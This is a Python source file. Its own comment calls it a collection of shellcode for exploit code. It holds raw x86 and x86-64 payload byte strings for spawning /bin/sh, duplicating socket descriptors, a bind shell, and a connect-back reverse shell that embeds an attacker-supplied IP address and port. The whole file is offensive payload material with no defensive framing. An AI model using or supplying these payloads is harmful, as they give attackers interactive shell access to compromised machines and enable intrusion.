#!/usr/bin/python
from struct import *
# a collection of shellcode use regulary on exploit code.

def stoh(host):
	byte_s = ''
	if host.count('.') == 3:
		for p in host.split('.'):
			byte_s += chr(int(p))
	return byte_s

class x86:
	def dupsSock(self):
		dups = "\x31\xc9\x6a\x04\x5b\x6a\x3f\x58\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf4"
		return dups

	def execveShell(self):
		execve = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
		return execve

	def execveShellBypassScanf(self):
		# execve('/bin/sh') # use for scanf("%s")
		execve = "\x6a\x0f\x58\x83\xe8\x04\x99\x52\x66\x68\x2d\x70"
		execve+= "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f"
		execve+= "\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
		return execve

	def bindShell(self,port):
		bind_shell = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
		bind_shell+= "\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
		bind_shell+= "\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
		bind_shell+= "\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
		bind_shell+= "\x89\xe3\x31\xc9\xcd\x80"
		return bind_shell

	def backconnectShell(self,host,port):
		if stoh(host) == '':
			raise Exception('Invalid Host')

		if not isinstance(port,int):
			raise Exception('Invalid Port')

		connect_back = "\x68"
		connect_back+= stoh(host) #// <- IP Number "127.1.1.1"
		connect_back+= "\x5e\x66\x68"
		connect_back+= pack('>I',port)[2:]   #// <- Port Number "55555"
		connect_back+= "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
		connect_back+= "\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
		connect_back+= "\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
		connect_back+= "\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
		connect_back+= "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
		connect_back+= "\xeb\xce"
		return connect_back

class x86_64:
	def dupsSock(self):
		dups = "\x48\x31\xf6\x6a\x04\x5f\x6a\x21\x58\x0f\x05\x40\xfe\xc6\x40\x80\xfe\x03\x75\xf2"
		return dups

	def execveShell(self):
		execve = "\xeb\x1d\x5b\x31\xc0\x67\x89\x43\x07\x67\x89\x5b\x08\x67\x89\x43\x0c"
		execve+= "\x31\xc0\xb0\x0b\x67\x8d\x4b\x08\x67\x8d\x53\x0c\xcd\x80\xe8\xde\xff"
		execve+= "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42"
		execve+= "\x42"
		return execve

	def execveSmallShell(self):
		execve = "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
		execve+= "\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
		execve+= "\x54\x5f\x6a\x3b\x58\x0f\x05"
		return execve